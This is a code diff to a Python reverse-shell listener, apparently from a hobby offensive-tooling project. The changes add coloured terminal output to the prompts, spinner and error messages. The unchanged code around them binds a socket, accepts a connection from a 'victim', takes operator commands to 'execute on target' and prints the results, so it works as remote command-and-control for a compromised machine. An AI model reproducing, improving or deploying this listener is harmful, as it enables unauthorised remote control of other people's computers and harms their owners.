@@ -2,7 +2,18 @@ import socket, sys, json, argparse, subprocess
 from sys import getsizeof
 from itertools import cycle
 import multiprocessing, time
-
+class fc:
+    rw = '\033[31;107m'
+    r = '\033[38;5;196m'
+    pv = '\033[38;5;206;48;5;57m'
+    end = '\033[0m'
+    pink = '\033[38;5;206m'
+    y = '\033[0;33;40m'
+    purple = '\033[0;35m'
+    wg = '\033[37;42m'
+    cyan = '\033[36m'
+    g = '\033[38;5;154m'
+    b = '\033[38;5;45m'
 class Args:
     def __init__(self):
         parser = argparse.ArgumentParser()
@@ -33,7 +44,7 @@ class Listener:
         self.listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
         self.listener.bind((str(ip),port)) #bind to this machine! 127.0.0.1 might work to? 
         self.listener.listen(0)
-        print('Starting listener on address {} and port {}.\nWaiting for connection...'.format(ip,port)) #add a threading spinner here
+        print(f'Starting listener on address {fc.b}{ip}{fc.end} and port {fc.b}{port}{fc.end}.\n{fc.y}Waiting for connection...{fc.end}'.format(ip,port)) #add a threading spinner here
         spinner.start()
         try:
             self.connection,address = self.listener.accept() #address is tuple with address and port
@@ -43,8 +54,8 @@ class Listener:
             sys.exit()
         #print(connection) #connection is the socket object with information about local address and remote address
         spinner.terminate()
-        print('Connection established with ' + str(address[0]) + ' on port ' + str(address[1]))
-        print('Enter \'bye\' to close connection')
+        print(f'{fc.g}Connection established with {fc.pink}{str(address[0])}{fc.end} on port {fc.pink}{str(address[1])}{fc.end}')
+        print(f'Enter {fc.rw}\'bye\'{fc.end} to close connection')
     
     
     def sendStream(self,data):
@@ -56,7 +67,7 @@ class Listener:
         spinnerChars = ['-', '/', '|', '\\']
         while True:
             for char in cycle(spinnerChars):
-                print(char,end='\r')
+                print(f'{fc.pv}{char}{fc.end}',end='\r')
                 time.sleep(.2)
 
     
@@ -73,7 +84,7 @@ class Listener:
                 jsData = jsData + recvData
                 return json.loads(jsData)
             except Exception as e:
-                #print(e)
+                print(f'{fc.rw}{e}{fc.end}\n{fc.wg}Incomplete stream, gathering remainder of data.{fc.end}')
                 continue
                 
     def utf8len(self,string):
@@ -94,19 +105,19 @@ class Listener:
         while True:
             inputChecker = False
             while inputChecker == False:
-                cmd = input('Enter command to execute on target:')
+                cmd = input(f'{fc.r}Enter command to execute on target:{fc.end}')
                 if cmd == '':
-                    print('Command must not be blank')
+                    print(f'{fc.rw}Command must not be blank!{fc.end}')
                 else:
                     inputChecker = True
             if cmd != 'bye':
                 result = self.executeCmd(cmd)
-                print('Output from victim, {} bytes long'.format(self.utf8len(result)))
-                print('#'*100)
-                print(result)
-                print('#'*100)
+                print(f'Output from victim, {fc.g}{self.utf8len(result)}{fc.end} bytes long')
+                print(f'{fc.purple}#{fc.end}'*100)
+                print(f'{fc.b}{result}{fc.end}')
+                print(f'{fc.purple}#{fc.end}'*100)
             else:
-                print('Exit call received, closing connection')
+                print(f'{fc.rw}Exit call received, closing connection{fc.end}')
                 self.listener.close()
                 sys.exit() 
           
